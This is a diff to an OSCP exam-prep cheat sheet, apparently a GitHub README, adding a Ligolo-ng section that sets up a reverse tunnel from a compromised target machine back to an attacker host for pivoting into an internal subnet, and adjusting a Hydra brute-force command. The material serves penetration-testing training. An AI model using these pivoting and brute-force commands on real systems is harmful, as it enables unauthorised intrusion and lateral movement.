@@ -37,6 +37,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
 		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
+		- [Ligolo-ng](https://github.com/0xsyr0/OSCP#ligolo-ng)
 		- [Linux](https://github.com/0xsyr0/OSCP#linux)
 		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
 		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
@@ -599,6 +600,57 @@ add_principal <EMAIL>            // add a new user to a keytab file
 ksu                              // executes a command with kerberos authentication
 klist -k /etc/krb5.keytab        // lists keytab file
 kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
+```
+
+#### Ligolo-ng
+
+> https://github.com/nicocha30/ligolo-ng
+
+##### Download Proxy and Agent
+
+```c
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+```
+
+##### Prepare Tunnel Interface
+
+```c
+sudo ip tuntap add user $(whoami) mode tun ligolo
+```
+
+```c
+sudo ip link set ligolo up
+```
+
+##### Setup Proxy on Attacker Machine
+
+```c
+./proxy -laddr <LHOST>:443 -selfcert
+```
+
+##### Setup Agent on Target Machine
+
+```c
+./agent -connect <LHOST>:443 -ignore-cert
+```
+
+##### Session
+
+```c
+ligolo-ng » session
+```
+
+```c
+[Agent : user@target] » ifconfig
+```
+
+```c
+sudo ip r add 172.16.1.0/24 dev ligolo
+```
+
+```c
+[Agent : user@target] » start
 ```
 
 #### Linux
@@ -2207,7 +2259,7 @@ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 #### Hydra
 
 ```c
-hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/list ftp|ssh|smb://<RHOST>
+hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<RHOST>
 ```
 
 ```c
